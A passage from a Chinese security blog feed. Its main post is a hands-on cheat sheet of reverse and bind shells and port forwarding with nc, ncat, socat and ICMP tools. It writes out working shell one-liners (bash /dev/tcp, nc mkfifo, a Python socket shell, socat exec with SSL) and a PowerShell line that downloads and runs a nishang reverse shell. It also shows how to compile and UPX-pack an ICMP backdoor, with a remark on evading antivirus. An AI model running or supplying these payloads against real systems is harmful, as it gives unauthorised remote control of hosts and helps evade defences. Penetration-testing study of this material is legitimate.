<p>自从学业结束以来就很少打开了，我便萌生了单系统使用Manjaro的想法，于是就这么做了。<br>这次为了省电我并没有安装显卡驱动。</p>
<hr>
<p>结果大约半年后，我就从manjaro叛逃到arch了（</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom命令自动补全</title>
    <url>/2020/09/07/msfvenom%E5%91%BD%E4%BB%A4%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>要求：zsh</p>
<p>zsh怎么安装就不说了。</p>
<p>其实就是使用了奶猫大佬的一个自动补全脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Green-m/msfvenom-zsh-completion ~/.oh-my-zsh/custom/plugins/msfvenom/</span><br></pre></td></tr></table></figure>

<p>接着往zshrc添加插件即可</p>
<p><img src="https://images.atsud0.me/images/post/image-20200907105056909.png" alt="image-20200907105056909"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>之后就可以了。感谢大佬！🙏</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹Shell方式以及端口转发</title>
    <url>/2020/04/24/netcat-socat%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>nc体积小，功能强大,跨平台，有了nc就不需要telnet了。nc可以完成telnet的所有工作.</p>
</blockquote>
<p><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe" target="_blank" rel="noopener">nc下载</a></p>
<p>32位比64位更稳定些。</p>
<a id="more"></a>

<h2 id="ICMP-Shell"><a href="#ICMP-Shell" class="headerlink" title="ICMP-Shell"></a>ICMP-Shell</h2><p>Windows和Linux下建立基于ICMP下的reverse shell方法。</p>
<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先下载<a href="https://github.com/inquisb/icmpsh.git" target="_blank" rel="noopener">项目</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git &#x2F;opt&#x2F;icmp_reverse_shell</span><br></pre></td></tr></table></figure>

<p>Kali预装了<code>python2</code>和<code>python3</code>，但是却不预装<code>pip</code>。。加上pip2已经被移除官方源，所以只能通过<code>get-pip.py</code>来安装。</p>
<p>python2-pip&amp;pip2-impacket安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/2.6/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br><span class="line"></span><br><span class="line">pip2 install --upgrade pip</span><br><span class="line"></span><br><span class="line">pip2 install impacket</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201101142913021.png" alt="image-20201101142913021"></p>
<p>这样就算是监听起来了。</p>
<p>这里输入的ip，是要公网地址，或者是内网地址。所以受害者必须要有一个公网ip地址，能让icmp包直达，或者是你在内网里，用跳板机起的监听。</p>
<h3 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>但是，不成功在<code>Windows10</code>下使用脚本给出的</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">128</span> -d <span class="number">500</span> -v <span class="number">30</span> -s <span class="number">128</span></span><br></pre></td></tr></table></figure>

<p>并没有像文章<a href="https://www.freebuf.com/articles/system/50361.html" target="_blank" rel="noopener">剑走偏锋：细数Shell那些事</a>作者<code>xia0k</code>那样直接返回一个<code>shell</code>。<code>Win10</code>下运行什么反应都没。。(待后续继续尝试)</p>
<p>换<code>windows server 2012</code>。好家伙，有反应了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101143251260.png" alt="image-20201101143251260"></p>
<p>因为是走icmp，所以在windows下使用<code>netstat -ant</code>命令是看不到有外连ip的。只能从进程中看到</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101143425591.png" alt="image-20201101143425591"></p>
<p>这程序也是会报毒的，所以要自己做下免杀才行。但实际上对源码不做改动，刚编译出来拿去跑<a href="http://www.virustotal.com" target="_blank" rel="noopener">virustotal.com</a>国内大部分杀毒都没识别到呢</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101151107570.png" alt="image-20201101151107570"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Linux编译</span></span><br><span class="line"></span><br><span class="line">apt install gcc-mingw-w64</span><br><span class="line"></span><br><span class="line">i686-w64-mingw32-gcc-win32 icmpsh-s.c -o abc.exe</span><br><span class="line"></span><br><span class="line">upx -v abc.exe -o abc-slave.exe</span><br></pre></td></tr></table></figure>

<h4 id="powershell-reverse-icmp-shell"><a href="#powershell-reverse-icmp-shell" class="headerlink" title="powershell reverse icmp shell"></a>powershell reverse icmp shell</h4><p><code>Windows</code> 下也可以去用<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" target="_blank" rel="noopener">powershell</a>滴。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com</span></span><br><span class="line"><span class="string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201101153255502.png" alt="image-20201101153255502"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201101153344176.png" alt="image-20201101153344176"></p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在<code>Google</code>找到以下文章，可能是<code>icmp-shell</code>的Linux版 : <a href="https://medium.com/@int0x33/day-20-ping-pwn-icmp-shell-for-linux-using-icmp-tunnels-2bab37eda271" target="_blank" rel="noopener">ping-pwn — Writing an ICMP Shell for Linux using ICMP tunnels &amp; Scapy</a></p>
<p>但是呢，即使是在root用户下运行也提示。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101152216441.png" alt="image-20201101152216441"></p>
<p>经过Google，我发现[<a href="https://github.com/bgylde/PingForAndroid/issues/1]这里给出了一个解决方案" target="_blank" rel="noopener">https://github.com/bgylde/PingForAndroid/issues/1]这里给出了一个解决方案</a></p>
<blockquote>
<p>Have a try for socket(AF_INET, SOCK_RAW, IPPROTO_ICMP). You need to assemble the ICMP package yourself.</p>
</blockquote>
<p>改动了一下代码后，脚本确实能起来了。但是执行的结果是啥我也不知道。。看上去是没有正确的将执行结果发回来</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101161706406.png" alt="image-20201101161706406"></p>
<h4 id="ish"><a href="#ish" class="headerlink" title="ish"></a><a href="http://icmpshell.sourceforge.net/" target="_blank" rel="noopener">ish</a></h4><p>相比上面那两个脚本，ish更为简单易用，，不过要注意的是这个<code>ish</code>是<code>bind shell</code>。并不是<code>reverse shell</code>。</p>
<p>安装并编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nchc.dl.sourceforge.net/project/icmpshell/ish/v0.2/ish-v0.2.tar.gz</span><br><span class="line">tar zxvf ish-v0.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ISHELL-v0.2/</span><br><span class="line">make linux</span><br></pre></td></tr></table></figure>

<p>被控端执行 ishd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ishd -i 65535 -t 0 -p 1024</span><br></pre></td></tr></table></figure>

<p>控制端执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;ish -i 65535 -t 0 -p 1024 192.168.179.128</span><br></pre></td></tr></table></figure>

<p>这里的<code>sessions id</code>要对应，即<code>-i</code>参数控制端和被控制端要一致。</p>
<p>更坑的是，<code>ishd</code>不管你执行成不成功都不会有任何回显信息，只能通过<code>ps</code>来查看进程到底有没有在运行，即使运行了也可能会有种种原因，导致控制的无法连接。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101163826019.png" alt="image-20201101163826019"></p>
<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>现阶段，就Windows的ICMP Reverse Shell 来说成熟。Linux的就。。。</p>
<h3 id="本节参考链接"><a href="#本节参考链接" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
<li><a href="https://www.freebuf.com/articles/system/50361.html" target="_blank" rel="noopener">剑走偏锋：细数Shell那些事</a></li>
<li><a href="https://medium.com/@int0x33/day-20-ping-pwn-icmp-shell-for-linux-using-icmp-tunnels-2bab37eda271" target="_blank" rel="noopener">ping-pwn — Writing an ICMP Shell for Linux using ICMP tunnels &amp; Scapy</a></li>
<li><a href="https://lilydjwg.is-programmer.com/2013/10/29/non-privileged-icmp-ping.41390.html" target="_blank" rel="noopener">不需要 root 权限的 ICMP ping-依云</a></li>
<li><a href="[https://github.com/bgylde/PingForAndroid/issues/1]">IPPROTO_ICMP Permission denied</a></li>
<li><a href="http://www.361way.com/linux-icmp-shell-ish/3284.html" target="_blank" rel="noopener">linux下一个ICMP shell（backdoor）</a></li>
<li>[powershell反弹shell的常见方式](</li>
</ul>
<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>nc可以做什么?</p>
<ul>
<li>传输文本信息(明文</li>
<li>传输文件/目录</li>
<li>加密传输文件</li>
<li>远程控制/木马   —-nc不会被杀毒软件查杀?</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<p>可以做客户端使用，也可以做服务端。</p>
<p>作为客户端时，不建议直接去解析域名，应该直接连接他的ip地址<br> -v 显示详细的连接信息<br> -n 不进行dns<br> -q 标准输入后等待x秒后退出<br> -l 开始监听<br> -p 指定端口<br> -z 端口扫描<br> -c 提供shell</p>
<p>nc的弱点:</p>
<ul>
<li>明文传输,容易被嗅探,容易被中间人劫持.</li>
<li>缺乏身份验证</li>
</ul>
<p>nc的升级版–ncat 可以使用ssl加密和允许某个ip连接</p>
<h4 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h4><p>服务端:<br><code>nc -lvp 1234</code></p>
<p>客户端:<br><code>nc -nv ip 1234</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_101430.jpg" alt="传输文本信息"></p>
<h4 id="利用nc进行收集信息"><a href="#利用nc进行收集信息" class="headerlink" title="利用nc进行收集信息"></a>利用nc进行收集信息</h4><p>A服务端:<br><code>ps -ef|nc -lvp 1234</code></p>
<p>B客户端:<br><code>nc -nv ip 1234 &gt; ps.txt</code></p>
<p>这个是由A服务端传给B客户端</p>
<p>A服务端:<br><code>nc -lvp 1234 &gt; a.txt</code><br>B客户端:<br><code>ls -l|nc -nv ip 1234</code></p>
<p>这个是由B客户端发给A服务端</p>
<p>为什么要这样进行因为电子取证的时候，要保护目标机器的原始状态，保证目标机器的文件不被损坏。</p>
<h4 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h4><p>将B的a.txt文件传给A</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:nc -lp 1234&gt;a.txt</span><br><span class="line">B:nc -nv ip 1234 &lt;a.txt -q 1</span><br></pre></td></tr></table></figure>

<p>将A的2.sh文件传给B</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:nc -lp 1234 &lt;2.sh</span><br><span class="line">B:nc -nv ip 1234 &gt;c.txt -q 1</span><br></pre></td></tr></table></figure>

<h5 id="加密传输文件"><a href="#加密传输文件" class="headerlink" title="加密传输文件"></a>加密传输文件</h5><p>A机器监听端口等待文件上传解密<br>B机器上的a.nmap加密后传送给A机器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:nc -lvp 1234|mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; b.nmap</span><br><span class="line">B:mcrypt --flush -Fbq -a rijndael-256 -m ecb&lt;a.nmap|nc -nv ip -q 1</span><br></pre></td></tr></table></figure>

<h4 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h4><p>将A机器的目录打包后传输给B机器解包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:tar cvf - .&#x2F;aaa | nc -lvp 1234 -q 1</span><br><span class="line">B:nc -nv ip 1234 | tar xf - .&#x2F;</span><br></pre></td></tr></table></figure>


<p>反向连接，B机器等待A上线发送文件包并解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:tar cvf - .&#x2F;aaa |nc -nv ip 1234</span><br><span class="line">B:nc -lvp 1234|tar xf - .&#x2F;</span><br></pre></td></tr></table></figure>

<h5 id="加密传输目录"><a href="#加密传输目录" class="headerlink" title="加密传输目录"></a>加密传输目录</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:nc -lvp 1234|mcrypt --flush -Fbqd -a rijndael-256 -m ecb|tar xvf -</span><br><span class="line"></span><br><span class="line">B:tar cvf - .&#x2F;aaa |mcrypt --flush -Fbq -a rijndael-256 -m ecb|nc -nv ip 1234 -q 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:tar cvf - .&#x2F;Downloads|mcrypt --flush -Fbq -a rijndael-256 -m ecb|nc -lvp 1234 -q 1</span><br><span class="line">B:nc -nv ip 1234|mcrypt --flush -Fbqd -a rijndael-256 -m ecb|tar xvf - .&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="流媒体服务器"><a href="#流媒体服务器" class="headerlink" title="流媒体服务器"></a>流媒体服务器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat 1.mp4|mc -lp</span><br></pre></td></tr></table></figure>

<h4 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h4><p>不建议。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvz ip 1-65535</span><br></pre></td></tr></table></figure>

<h4 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h4><h5 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h5><p>A开启监听端口1234 提供bash，等待连接<br>B 连接上A，B控制A</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:nc -lp 1234 -c bash</span><br><span class="line">B:nc -nv ip 1234</span><br></pre></td></tr></table></figure>

<h5 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h5><p>A开启监听端口1234，<br>B连接A的，并提供shell</p>
<p>A控制B</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:nc -lp 1234</span><br><span class="line">B:nc -nv ip 1234 -c bash</span><br></pre></td></tr></table></figure>

<p>为什么要使用反向而不是正向?因为在idc机房中边界一般会有防火墙,通常防火墙一般不会打开一个不常见的端口允许外部的机器来进行连接.所以要使用反向连接,让在防火墙内部的机器去连接外部的机器</p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A:nv -lvp 1234</span><br><span class="line">B:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>bash -i 打开一个bash</p>
<p>&gt;&amp; 将标准输出和标准错误输出重定向到了 /dev/tcp/ip/1234 这个远程设备上。</p>
<p>0&gt;&amp;1 代表将标准输入重定向到标准输出，但是标准输出已经被重定向到了远程设备上，所以标准输入也被重定向到了远程设备上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 1.1.1.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<p>注意:/dev/tcp这个只在bash里有。</p>
<blockquote>
<p>hz大佬:所以bash为啥会有这东西啊，(bash果真就搞破坏专用（，自带一堆方便后门的工具（</p>
</blockquote>
<blockquote>
<p>过于生草..</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;bash -c &#39;$@|bash&#39; &#39;&#39; &#39;echo&#39; &#39;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;4444 0&lt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
<p>来自<a href="https://mp.weixin.qq.com/s/CAtsX3yP81mULbMDTo0J1A" target="_blank" rel="noopener">文章</a></p>
<h4 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A：nc -lvp 8888</span><br><span class="line">B：python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.10.10&#39;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os,socket,subprocess</span><br><span class="line"></span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((&#39;192.168.40.228&#39;,8888))  </span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])</span><br></pre></td></tr></table></figure>

<h3 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h3><p>正向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ncat -c bash --allow 192.168.1.2 -vnl 333 --ssl</span><br></pre></td></tr></table></figure>

<h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><p>攻击机IP：192.168.2.84</p>
<p>受害机IP：192.168.3.76</p>
<h4 id="简易聊天窗口"><a href="#简易聊天窗口" class="headerlink" title="简易聊天窗口"></a>简易聊天窗口</h4><p>服务端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat - tcp-listen:1234</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 -</span><br></pre></td></tr></table></figure>

<p><code>-</code>,<code>STDIN</code>,<code>STDOUT</code> 表示标准输入输出，可以用一个横杠代替。</p>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>下面的<code>STDIN</code>表示标准输入和用一个<code>-</code>效果一样的</p>
<p>服务端通过管道符将<code>cat svmgrsvc.log</code>的输出作为标准输入传递给socat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat svmgrsvc.log|socat tcp-listen:1234 STDIN</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 STDOUT</span><br></pre></td></tr></table></figure>

<p>如果要将服务端传过来的数据保存成文件的话，不能直接使用管道符或者是重定向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;c.txt,</span><br><span class="line">create</span><br></pre></td></tr></table></figure>

<p>将程序/脚本输出传递也是一样的啦</p>
<p>服务端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ef|socat tcp-listen:1234 STDIN</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;f.txt,create</span><br></pre></td></tr></table></figure>

<h5 id="传输文件-1"><a href="#传输文件-1" class="headerlink" title="传输文件"></a>传输文件</h5><p>服务端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:1234,fork file:&#x2F;tmp&#x2F;DidFinish.txt</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;b.txt,create</span><br></pre></td></tr></table></figure>

<h5 id="传递目录"><a href="#传递目录" class="headerlink" title="传递目录"></a>传递目录</h5><p>服务端</p>
<p>这里<code>tar</code>的<code>-</code>也可以替换为<code>STDOUT</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf - .&#x2F;aaa | socat TCP4-LISTEN:1234 STDIN</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;f.tar,create</span><br></pre></td></tr></table></figure>

<h5 id="读写分流"><a href="#读写分流" class="headerlink" title="读写分流"></a>读写分流</h5><p>实现一个假的 Web Server，客户端连过来之后就把 read.html 里面的内容传过去，同时把客户端的数据保存到 write.txt 里面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat open:read.html\!\!open:write.txt,create,append tcp-listen:8000,reuseaddr,fork</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201126132609324.png" alt="image-20201126132609324"></p>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat  TCP4-LISTEN:1234,bind&#x3D;127.0.0.1,reuseaddr,fork TCP4:192.168.3.74:22</span><br></pre></td></tr></table></figure>

<blockquote>
<p>bind 绑定监听的ip，不对其进行绑定的话则默认为0.0.0.0</p>
<p>Reuseaddr绑定一个本地端口</p>
<p>fork TCP4:&lt;ip address&gt;:&lt;port&gt; 转发到的服务器ip和端口</p>
</blockquote>
<h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><h5 id="反向-1"><a href="#反向-1" class="headerlink" title="反向"></a>反向</h5><p>攻击机执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat -d -d TCP4-LISTEN:1234 STDOUT</span><br></pre></td></tr></table></figure>

<p>受害机执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP:192.168.2.84:1233 EXEC:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>这样就打开了一个简易的<code>shell</code>，但是没有标准错误输出。取决于在受害机上执行的反弹命令</p>
<p>攻击机器执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:1234</span><br><span class="line"></span><br><span class="line">### 下面这条也行，取决于在受害机上执行的反弹命令</span><br><span class="line">socat TCP4-LISTEN:1234 STDOUT</span><br></pre></td></tr></table></figure>

<p>受害机执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.2.84:1234</span><br><span class="line"></span><br><span class="line">或者用正常的来弹回去也行</span><br><span class="line">bash -c &#39;bash &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.2.84&#x2F;1233 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>

<p>这样反弹回来的shell，是标准的终端属性。</p>
<p>在受害机上用<code>socat</code>反弹shell时，只要携带<code>stderr</code>这个参数，就有标准错误输出了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP:192.168.2.84:1233 EXEC:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>

<h5 id="正向-1"><a href="#正向-1" class="headerlink" title="正向"></a>正向</h5><p>受害机执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1234 EXEC:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>攻击机执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat - TCP:192.168.3.76:1234</span><br></pre></td></tr></table></figure>

<p>攻击机收到的shell有没有标准错误输出什么的，这里就取决于受害机的监听命令了 同样，带上个<code>stderr</code>就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1235 EXEC:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>

<h4 id="SOCAT加密传输"><a href="#SOCAT加密传输" class="headerlink" title="SOCAT加密传输"></a>SOCAT加密传输</h4><p>创建key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -nodes -keyout atsud0.key -x509 -days 362 -out atsud0.crt</span><br><span class="line"></span><br><span class="line">cat atsud0.key atsud0.crt &gt;atsud0.pem</span><br></pre></td></tr></table></figure>

<p>开启加密监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat openssl-listen:1234,cert&#x3D;atsud0.pem,verify&#x3D;0 -</span><br></pre></td></tr></table></figure>

<p>如果监听用的是openssl加密，而客户端则不用的话是不能连接上的。其余用法大致和tcp一样。</p>
<p>客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat - openssl:192.168.2.84:1235,verify&#x3D;0</span><br></pre></td></tr></table></figure>

<p>客户端反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat openssl:192.168.2.84:1234,verify&#x3D;0 exec:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>

<h4 id="socat和nc一起用"><a href="#socat和nc一起用" class="headerlink" title="socat和nc一起用"></a>socat和nc一起用</h4><p>socat 监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:1234 -</span><br></pre></td></tr></table></figure>

<p>用nc反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.2.84 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<p>是可以用的。。</p>
<p>socat正向shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1234 EXEC:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>

<p>Nc 去连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.2.84 1234</span><br></pre></td></tr></table></figure>

<p>这样也是可以的</p>
<h4 id="本节参考链接-1"><a href="#本节参考链接-1" class="headerlink" title="本节参考链接"></a>本节参考链接</h4><ul>
<li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_3" target="_blank" rel="noopener">反弹shell研究</a></p>
</li>
<li><p><a href="https://www.hi-linux.com/posts/61543.html" target="_blank" rel="noopener">socat入门教程</a></p>
</li>
</ul>
<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p>服务端：frps</p>
<p>客户端：frpc</p>
<p>参考</p>
<p><a href="https://gofrp.org/docs/features/common/network/network/" target="_blank" rel="noopener">https://gofrp.org/docs/features/common/network/network/</a></p>
<p><a href="https://sspai.com/post/52523" target="_blank" rel="noopener">https://sspai.com/post/52523</a></p>
<p><a href="https://www.anquanke.com/post/id/184855#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184855#h3-4</a></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>nc</tag>
        <tag>ncat</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH隧道及rinted端口转发</title>
    <url>/2020/07/06/rinted%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>如何使用SSH隧道和rinted等工具进行端口转发，实现内网穿透。</p>
<a id="more"></a>

